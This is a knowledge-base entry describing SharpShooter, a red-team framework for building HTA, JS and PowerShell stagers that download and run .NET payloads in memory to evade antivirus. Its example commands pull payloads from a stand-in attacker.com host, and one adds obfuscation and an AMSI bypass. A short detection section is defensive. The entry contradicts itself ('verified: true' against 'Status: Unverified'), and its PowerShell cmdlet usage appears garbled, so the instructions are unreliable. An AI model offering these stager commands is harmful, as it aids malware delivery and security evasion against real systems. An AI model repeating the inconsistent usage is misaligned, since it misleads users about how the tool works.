---
id: 29d5b237-09d1-41f6-bd8e-a1535291f2f2
type: tool
verified: true
created_at: '2019-08-28T21:17:26.489731+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Windows
tags:
  - payload-generation
  - dotnet
  - redteam
  - bypass-av
url: 'https://github.com/mdsecresearch/SharpShooter'
validated: true
---

# SharpShooter

**Status**: Unverified

## Overview

SharpShooter is a payload creation framework designed for the retrieval and in-memory execution of arbitrary C# source code. It generates stagers in various formats (e.g., HTA, JS, PS1) that download and execute .NET assemblies without writing to disk, commonly used in red team engagements to evade antivirus detection and establish command and control.

## Description

SharpShooter operates by creating multi-stage payloads: a stager fetches a delivery payload (containing obfuscated C# code), which then retrieves and executes a final stage. It supports multiple output formats and obfuscation techniques to blend with legitimate traffic. Ideal for post-exploitation scenarios where .NET execution is needed on Windows targets without requiring additional tools on the victim machine.

## Features

- Feature 1: Generates payloads in HTA, JS, PowerShell, and VBA formats for flexible delivery.
- Feature 2: Supports URL-based retrieval of payloads with customizable user agents and HTTP methods.
- Feature 3: Includes obfuscation options to encode strings and AMSI/ETW bypasses for stealthy execution.
- Feature 4: In-memory execution of .NET assemblies to avoid disk-based detection.

## Installation

### Requirements

- PowerShell 2.0 or later (Windows default).
- Internet access for git clone.
- .NET Framework 4.0+ on the generation machine (for testing payloads).

### Install Commands

```bash
# Clone the repository
 git clone https://github.com/mdsecresearch/SharpShooter.git

# Navigate to the directory
 cd SharpShooter

# (Optional) Import the module if treating as module
 Import-Module .\SharpShooter.psm1
```

On Kali Linux or Ubuntu (for cross-compilation):

```bash
sudo apt update && sudo apt install git powershell -y
# Then run the above git clone and use pwsh to execute
```

## Basic Usage

```powershell
Get-Help Invoke-SharpShooter -Full
```

### Common Options

| Option | Description |
|--------|-------------|
| -PayloadUrl | Specifies the URL for the initial payload assembly. |
| -DeliveryUrl | URL containing the C# source code for execution. |
| -Format | Output format (HTA, JS, PS1, VBA). |
| -Obfuscate | Enables string and code obfuscation. |
| -UserAgent | Custom user agent for HTTP requests. |

## Examples

### Example 1: Basic Usage

Generate a basic HTA payload:

```powershell
Invoke-SharpShooter -PayloadUrl http://attacker.com/payload.dll -DeliveryUrl http://attacker.com/delivery.xml -Stage2Url http://attacker.com/stage2.dll -OutputPath ./output/basic.hta
```

### Example 2: Advanced Usage

Generate an obfuscated JS payload:

```powershell
Invoke-SharpShooter -PayloadUrl http://attacker.com/payload.dll -DeliveryUrl http://attacker.com/delivery.xml -Stage2Url http://attacker.com/stage2.dll -OutputPath ./output/obf.js -Format JS -Obfuscate -Bypass AMSI
```

## MITRE ATT&CK Mapping

This tool is commonly associated with:

### Techniques

- [[PowerShell]] PowerShell
- [[Remote File Copy]] Ingress Tool Transfer
- [[Obfuscated Files or Information]] Obfuscated Files or Information

### Tactics

- [[Execution]] Execution
- [[Command and Control]] Command and Control

## Detection

Indicators and methods for detecting this tool's usage:

- Detection method 1: Monitor for PowerShell downloads from unusual URLs or execution of HTA/JS files with network activity.
- Detection method 2: AMSI logs showing obfuscated .NET assembly loads or ETW bypass attempts.
- Detection method 3: File creation of .hta or .js with embedded VBScript/JScript calling .NET types.

## Related Procedures

```dataview
TABLE name as "Procedure", verified as "Verified"
FROM "procedures"
WHERE contains(tools, this.file.link)
SORT name ASC
LIMIT 10
```

## Related Tools

- [[tools/Donut]]
- [[tools/Covenant]]

## References

- Official GitHub: https://github.com/mdsecresearch/SharpShooter
- MDSec Blog: https://www.mdsec.co.uk/category/red-team/

*Last updated: 2023-10-01*
